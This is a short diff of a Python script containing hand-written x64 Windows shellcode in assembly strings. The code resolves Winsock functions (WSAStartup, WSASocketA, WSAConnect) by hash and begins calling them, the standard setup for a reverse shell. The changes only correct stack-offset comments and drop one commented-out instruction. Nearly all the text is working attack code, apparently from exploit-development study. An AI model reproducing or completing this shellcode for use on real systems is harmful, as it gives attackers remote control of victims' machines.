@@ -123,13 +123,13 @@ def main():
         " resolve_functions_ws2_32:         "
         "   mov r15, 0x3bfcedcb             ;"  # WSAStartup hash
         "   call qword ptr [rbp+0x08]       ;"  # Call find_function
-        "   mov [rbp+0x30], rax             ;"  # Save WSAStartup to [rbp+0x18]
+        "   mov [rbp+0x30], rax             ;"  # Save WSAStartup to [rbp+0x30]
         "   mov r15, 0xadf509d9             ;"  # WSASocketA hash
         "   call qword ptr [rbp+0x08]       ;"  # Call find_function
-        "   mov [rbp+0x38], rax             ;"  # Save WSASocketA to [rbp+0x20]
+        "   mov [rbp+0x38], rax             ;"  # Save WSASocketA to [rbp+0x38]
         "   mov r15, 0xb32dba0c             ;"  # WSAConnect hash
         "   call qword ptr [rbp+0x08]       ;"  # Call find_function
-        "   mov [rbp+0x40], rax             ;"  # Save WSAConnect to [rbp+0x20]
+        "   mov [rbp+0x40], rax             ;"  # Save WSAConnect to [rbp+0x40]
         
         " dummy_2:                          "  # stage 2 and 3 separator 0x90 * 10
         "   nop                             ;"
@@ -144,7 +144,6 @@ def main():
         "   nop                             ;"
         
         " call_wsastartup:                  "
-        #"   xor rcx, rcx                    ;"  # Clear RCX
         "   add rsp, 0xfffffffffffffdf8     ;"  # Allocate stack space, for lpWSAData structure, second argument (note the 8 is for stack alignment because lpWSAData is only 8 bytes)
         "   mov cx, 0x202                   ;"  # First argument, wVersionRequired
         "   mov rdx, rsp                    ;"  # Move ESP to RDX, space for lpWSAData
